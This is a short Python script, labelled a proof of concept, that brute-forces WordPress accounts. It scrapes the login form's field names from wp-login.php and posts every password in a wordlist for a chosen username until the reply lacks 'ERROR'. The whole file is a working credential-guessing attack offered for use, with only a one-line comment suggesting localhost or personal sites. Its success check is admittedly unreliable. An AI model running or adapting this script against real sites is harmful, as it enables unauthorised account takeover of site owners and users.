import sys
from bs4 import BeautifulSoup;
import requests

# simple brute force POC using BeautifulSoup
# for testing use on localhost or personal sites
def usage():
    if len(sys.argv) < 4:
        print('''Usage: <url> <wordlist> <username>. 
            \nEnter target URL, path to wordlist and a target username. 
            \nMust be a valid Wordpress site.''')
        sys.exit(1)
usage()

def wp_bruter():
    try:
        target = 'http://{}/wp-login.php'.format(str(sys.argv[1]))
        site = requests.get(str(target))

        if site.status_code == 200:
            print('Attempting to login..')
        else:
            print('Unable to access. Is this a WP site?')
    except requests.exceptions.RequestException as err:
        print('There was a problem with the supplied URL ', err)
    
    try: 
        soup = BeautifulSoup(site.content, 'html.parser')
        target_fields = [el['name'] for el in soup.find_all('input')][0:2] # get username & pass attr[name] values

        pass_list = str(sys.argv[2])

        def file_handler(file):
            result = []
            with open(file, 'r') as f:
                for entry in f:
                    formatted_val = entry.strip('\n')
                    result.append(formatted_val)
            return result

        passwords = file_handler(pass_list)
        username = sys.argv[3]

        for p in passwords:
            post_req = requests.post(target, data={target_fields[0]: username, target_fields[1]: p})
        
            # TODO: proper failure handling to prevent false positive output
            if 'ERROR' not in post_req.text:
                print('Success! The password for {} is {}'.format(username, p))
                break
            else:
                print('Invalid username or password', username, p)

    except Exception as err:
        print('Unable to parse form fields. Check the URL:', err)

wp_bruter()